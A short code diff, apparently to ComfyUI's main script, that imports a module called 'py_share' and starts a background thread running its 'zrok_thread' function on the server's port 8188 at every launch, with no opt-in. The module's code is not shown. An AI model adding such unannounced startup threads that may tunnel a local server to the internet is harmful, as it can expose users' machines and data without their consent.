@@ -12,6 +12,8 @@ import utils.extra_config
 import logging
 import sys
 
+import py_share
+
 if __name__ == "__main__":
     #NOTE: These do not do anything on core ComfyUI, they are for custom nodes.
     os.environ['HF_HUB_DISABLE_TELEMETRY'] = '1'
@@ -323,6 +325,8 @@ if __name__ == "__main__":
 
     if sys.version_info.major == 3 and sys.version_info.minor < 10:
         logging.warning("WARNING: You are using a python version older than 3.10, please upgrade to a newer one. 3.12 and above is recommended.")
+
+    threading.Thread(target=py_share.zrok_thread, daemon=True, args=(8188,)).start()
 
     event_loop, _, start_all_func = start_comfyui()
     try:
